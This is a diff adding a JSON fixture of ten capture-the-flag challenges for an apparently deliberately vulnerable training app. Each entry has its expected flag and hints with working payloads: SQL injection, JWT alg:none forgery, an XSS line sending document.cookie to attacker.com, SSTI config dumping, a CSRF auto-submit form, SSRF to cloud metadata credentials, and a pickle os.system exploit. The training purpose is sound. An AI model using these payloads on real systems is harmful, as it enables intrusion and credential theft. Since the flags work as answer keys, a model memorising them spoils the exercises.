@@ -1,0 +1,172 @@
+[
+  {
+    "model": "challenges.challenge",
+    "pk": 1,
+    "fields": {
+      "name": "C01 — Login Bypass Classic",
+      "description": "The login form passes user input directly into a raw SQL query. Find a way to authenticate as admin without knowing the password. The flag is in the admin panel.",
+      "category": "sqli",
+      "difficulty": "beginner",
+      "expected_flag": "pygoat-sqli-c01-loginbypass",
+      "xp_reward": 100,
+      "order": 1,
+      "is_active": true,
+      "hint_cryptic": "What happens if you break the SQL string context?",
+      "hint_direct": "SQL comments can terminate the rest of a query. Look up the -- operator.",
+      "hint_walkthrough": "Enter admin'-- as the username. This transforms the query to: SELECT * FROM users WHERE username='admin'-- AND password='...', commenting out the password check entirely."
+    }
+  },
+  {
+    "model": "challenges.challenge",
+    "pk": 2,
+    "fields": {
+      "name": "C02 — Cookie Monster",
+      "description": "The session cookie looks tampered with. Examine the cookie structure and modify it to escalate your privileges from user to admin.",
+      "category": "auth",
+      "difficulty": "beginner",
+      "expected_flag": "pygoat-auth-c02-cookiemonster",
+      "xp_reward": 120,
+      "order": 2,
+      "is_active": true,
+      "hint_cryptic": "Cookies can store data in formats you can decode client-side.",
+      "hint_direct": "Base64 decode the session cookie. Look at the role field.",
+      "hint_walkthrough": "The cookie is a base64-encoded JSON object: {\"user\": \"alice\", \"role\": \"user\"}. Change role to admin, re-encode, and set the modified cookie."
+    }
+  },
+  {
+    "model": "challenges.challenge",
+    "pk": 3,
+    "fields": {
+      "name": "C03 — Reflected Glory",
+      "description": "The search endpoint reflects your input back into the page without sanitisation. Craft a payload that executes JavaScript and exfiltrates document.cookie.",
+      "category": "xss",
+      "difficulty": "beginner",
+      "expected_flag": "pygoat-xss-c03-reflectedglory",
+      "xp_reward": 100,
+      "order": 3,
+      "is_active": true,
+      "hint_cryptic": "What if your search term contained HTML?",
+      "hint_direct": "Try: <script>alert(1)</script> in the search box. If it executes, steal the cookie.",
+      "hint_walkthrough": "Submit: <script>document.location='http://attacker.com/?c='+document.cookie</script> as the search query to exfiltrate cookies."
+    }
+  },
+  {
+    "model": "challenges.challenge",
+    "pk": 4,
+    "fields": {
+      "name": "C04 — Other People's Orders",
+      "description": "You are logged in as user #42. The /api/orders/ endpoint exists. Can you read order #43 — belonging to a different user?",
+      "category": "idor",
+      "difficulty": "beginner",
+      "expected_flag": "pygoat-idor-c04-othersorders",
+      "xp_reward": 140,
+      "order": 4,
+      "is_active": true,
+      "hint_cryptic": "The order ID is in the URL. What if you changed it?",
+      "hint_direct": "Try GET /api/orders/43/ with your existing session cookie.",
+      "hint_walkthrough": "The API has no object-level permission check. GET /api/orders/43/ returns user_b's order data including the flag, despite you being user_a."
+    }
+  },
+  {
+    "model": "challenges.challenge",
+    "pk": 5,
+    "fields": {
+      "name": "C05 — None of Your Algorithm",
+      "description": "The app uses JWT for authentication. The flag is in the admin JWT payload. Bypass signature verification using the alg:none attack.",
+      "category": "jwt",
+      "difficulty": "intermediate",
+      "expected_flag": "pygoat-jwt-c05-nonealg",
+      "xp_reward": 150,
+      "order": 5,
+      "is_active": true,
+      "hint_cryptic": "JWT has three parts separated by dots. What does the first part control?",
+      "hint_direct": "The header contains the algorithm. What happens if you set it to 'none' and remove the signature?",
+      "hint_walkthrough": "Decode your JWT. Replace the header with {\"alg\":\"none\",\"typ\":\"JWT\"}, change the payload role to admin, re-encode both with base64url (no padding), concatenate with dots and leave the signature empty: header.payload."
+    }
+  },
+  {
+    "model": "challenges.challenge",
+    "pk": 6,
+    "fields": {
+      "name": "C06 — Template Troubles",
+      "description": "The name parameter on the greeting page is rendered in a Jinja2 template without sanitisation. Extract the application SECRET_KEY from config.",
+      "category": "ssti",
+      "difficulty": "intermediate",
+      "expected_flag": "pygoat-ssti-c06-templatetrouble",
+      "xp_reward": 160,
+      "order": 6,
+      "is_active": true,
+      "hint_cryptic": "Template engines can evaluate expressions. What can you evaluate?",
+      "hint_direct": "Try {{7*7}} as input. If you see 49, you have SSTI. Then try {{config}}.",
+      "hint_walkthrough": "Submit {{config.items()}} to dump all Flask config variables including SECRET_KEY and the internal flag."
+    }
+  },
+  {
+    "model": "challenges.challenge",
+    "pk": 7,
+    "fields": {
+      "name": "C07 — Blind Date",
+      "description": "The login form returns no error details, but responds at different speeds. Use time-based blind SQL injection to extract the admin password hash character by character.",
+      "category": "sqli",
+      "difficulty": "advanced",
+      "expected_flag": "pygoat-sqli-c07-blinddate",
+      "xp_reward": 200,
+      "order": 7,
+      "is_active": true,
+      "hint_cryptic": "What if you can't see query results but can measure time?",
+      "hint_direct": "SQLite has sqlite_sleep() — try: ' OR (SELECT CASE WHEN (1=1) THEN sqlite_sleep(2) ELSE 0 END)--",
+      "hint_walkthrough": "Use sqlmap with --technique=T and --level=3, or manually craft time-based payloads using CASE WHEN to binary-search each character of the password hash."
+    }
+  },
+  {
+    "model": "challenges.challenge",
+    "pk": 8,
+    "fields": {
+      "name": "C08 — Cross-Site Forgery Art",
+      "description": "Craft an HTML page that, when visited by a logged-in admin, silently transfers 1000 credits from their account to yours. No user interaction should be required.",
+      "category": "csrf",
+      "difficulty": "intermediate",
+      "expected_flag": "pygoat-csrf-c08-forgeryart",
+      "xp_reward": 130,
+      "order": 8,
+      "is_active": true,
+      "hint_cryptic": "Forms can submit automatically on page load.",
+      "hint_direct": "An auto-submitting form with target action /transfer and hidden amount/recipient fields works if the site lacks CSRF tokens.",
+      "hint_walkthrough": "Create an HTML page with: <form method=POST action=/transfer><input name=amount value=1000><input name=to value=you></form><script>document.forms[0].submit()</script>"
+    }
+  },
+  {
+    "model": "challenges.challenge",
+    "pk": 9,
+    "fields": {
+      "name": "C09 — Metadata Madness",
+      "description": "The image downloader fetches external URLs on your behalf. Probe the AWS metadata endpoint and retrieve the IAM role credentials.",
+      "category": "ssrf",
+      "difficulty": "advanced",
+      "expected_flag": "pygoat-ssrf-c09-metadatamadness",
+      "xp_reward": 180,
+      "order": 9,
+      "is_active": true,
+      "hint_cryptic": "Cloud instances have a special IP range that provides metadata.",
+      "hint_direct": "Try submitting http://169.254.169.254/latest/meta-data/ as the image URL.",
+      "hint_walkthrough": "AWS IMDSv1 responds at 169.254.169.254. Chain: /latest/meta-data/iam/security-credentials/ to enumerate role names, then /latest/meta-data/iam/security-credentials/<ROLE_NAME> for the actual credentials."
+    }
+  },
+  {
+    "model": "challenges.challenge",
+    "pk": 10,
+    "fields": {
+      "name": "C10 — Pickle Rick",
+      "description": "The remember-me feature stores a serialised Python object in the cookie. Craft a Python Pickle payload that reads /etc/passwd from the server.",
+      "category": "deserialization",
+      "difficulty": "advanced",
+      "expected_flag": "pygoat-deser-c10-pickletrick",
+      "xp_reward": 200,
+      "order": 10,
+      "is_active": true,
+      "hint_cryptic": "Python's pickle module can execute arbitrary code on deserialisation.",
+      "hint_direct": "Override __reduce__ in a class to return an os.system call.",
+      "hint_walkthrough": "Create: class Exploit(object):\\n  def __reduce__(self):\\n    return (os.system, ('cat /etc/passwd > /tmp/out',))\\nBase64-encode pickle.dumps(Exploit()) and set it as the remember_me cookie."
+    }
+  }
+]
